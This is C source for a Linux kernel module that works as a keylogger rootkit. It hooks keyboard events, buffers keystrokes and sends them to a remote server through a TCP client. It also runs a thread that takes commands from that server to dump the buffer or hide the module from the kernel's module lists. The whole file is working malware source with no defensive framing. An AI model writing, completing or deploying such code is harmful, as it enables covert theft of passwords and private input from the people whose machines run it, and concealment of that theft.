#include <linux/module.h>
#include <linux/kernel.h>       
#include <linux/init.h>         
#include <linux/keyboard.h>
#include <linux/input.h>
#include "kl_utils.h"
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/kthread.h>  
#include <linux/sched.h>
#include <linux/time.h>
#include <linux/timer.h>

#define GET_BUFFER "1"
#define HIDE_MODULE "2"

char key_buffer[1024];
int buffer_index = 0;

static int record_keys(struct notifier_block *nblock, unsigned long code, void *_param) {

  struct keyboard_notifier_param *param = _param;
  int i;
  
  	if (code == KBD_KEYCODE) {

  	int val = param->value;
  		
	if (isShift(val) && param->down){
        shift_pressed++;
        return 0; 
	}

	if (isShift(val) && !param->down){
		shift_pressed=0;
		return 0;
	}
    
  	if (val <= sizeof(key_names) && param->down){

    	// check size and send to server
  		if (buffer_index > 100){
  			send_data(key_buffer, strlen(key_buffer));

  			for(i=0; i < 1024; i++){
  				key_buffer[i] = '\0';
  			}

  			buffer_index = 0;
  		}

    	strncpy(key_buffer + buffer_index, getKeyText(val), strlen(getKeyText(val)));

    	buffer_index += strlen(getKeyText(val));
  	}

  }  

}

static struct list_head *prev_module;
static struct list_head *prev_kobj_module;
static char hidden_module = 0;

void hide_module(void) {
	if (hidden_module) {
		return;
	}

	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);	

	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);

	hidden_module = !hidden_module;
}


static struct task_struct *listening_thread;

int thread_fn(void* data) {

	for(;;){
		receive_cmd(server_buffer);
		//printk(KERN_INFO "Received buffer from server: %s\n", server_buffer);

		if (strncmp(server_buffer, GET_BUFFER, 1) ==0){

			//printk(KERN_INFO "Sending buffer: %s\n", key_buffer);
			send_data(key_buffer, strlen(key_buffer));
  			

		} else if (strncmp(server_buffer, HIDE_MODULE, 1) ==0) {

			//printk(KERN_INFO "Hiding module\n");	
			hide_module();
		}

		//printk(KERN_INFO "Received %s from server\n", server_buffer);
	}


	return 0;
}

int listening_thread_init (void) {
   
    char our_thread[8]="listener";
    listening_thread = kthread_create(thread_fn,NULL,our_thread);

    if((listening_thread > 0))
    {
    	//printk(KERN_INFO "Waking thread");
    	wake_up_process(listening_thread);
    }

    return 0;
}

void thread_cleanup(void) {
	int ret;
	ret = kthread_stop(listening_thread);

	//if(!ret)
		//printk(KERN_INFO "Thread stopped");

}


static struct notifier_block nb = {
  .notifier_call = record_keys
};


static int __init kl_init(void)
{
	int i;
	for(i = 0; i < 1024; i++){
  		key_buffer[i] = '\0';
  	}
    register_keyboard_notifier(&nb);
    tcp_client_connect();
    listening_thread_init();
  	return 0;
}

static void __exit kl_exit(void)
{
    unregister_keyboard_notifier(&nb);
    send_data(key_buffer, strlen(key_buffer));
   
    close_client();
    thread_cleanup();
}


MODULE_LICENSE("GPL");
module_init(kl_init);
module_exit(kl_exit);
